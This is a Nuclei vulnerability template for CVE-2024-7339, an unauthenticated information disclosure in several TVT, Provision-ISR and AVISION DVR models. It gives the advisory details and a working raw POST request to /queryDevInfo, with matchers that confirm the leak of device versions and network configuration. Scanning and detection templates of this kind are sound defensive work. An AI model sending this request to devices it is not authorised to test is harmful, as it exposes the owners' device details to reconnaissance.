id: CVE-2024-7339

info:
  name: TVT DVR Sensitive Device - Information Disclosure
  author: Stuxctf
  severity: medium
  description: |
    A vulnerability has been found in TVT DVR TD-2104TS-CL, DVR TD-2108TS-HP, Provision-ISR DVR SH-4050A5-5L(MM) and AVISION DVR AV108T and classified as problematic. This vulnerability affects unknown code of the file /queryDevInfo. The manipulation leads to information disclosure.
  impact: |
    An attacker get detailed device information including hardware and software versions, serial numbers, and network configuration.
  remediation: |
    Implement strict access controls and authentication mechanisms to manage access to the device interfaces.
  reference:
    - https://netsecfish.notion.site/Sensitive-Device-Information-Disclosure-in-TVT-DVR-fad1cce703d946969be5130bf3aaac0d
    - https://netsecfish.notion.site/Sensitive-Device-Information-Disclosure-in-TVT-DVR-fad1cce703d946969be5130bf3aaac0d?pvs=4
    - https://vuldb.com/?ctiid.273262
    - https://vuldb.com/?id.273262
    - https://vuldb.com/?submit.379373
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cve-id: CVE-2024-7339
    cwe-id: CWE-200
    epss-score: 0.89111
    epss-percentile: 0.99513
  metadata:
    verified: true
    max-request: 1
  tags: cve,cve2024,dvr,tvt,info-leak

http:
  - raw:
      - |
        POST /queryDevInfo HTTP/1.1
        Host: {{Hostname}}

        <?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "softwareVersion"
          - "eth0"
        condition: and

      - type: status
        status:
          - 200
# digest: 4a0a0047304502206d8b342251186a2bcf3527f3a3e7a284d64d8c8a9eb55ed21a515468f3aee618022100db0609f29d5605bb066d590728a400561a4c0f2543d3c3d2cd796cfe35fdcc31:922c64590222798bb761d5b6d8e72950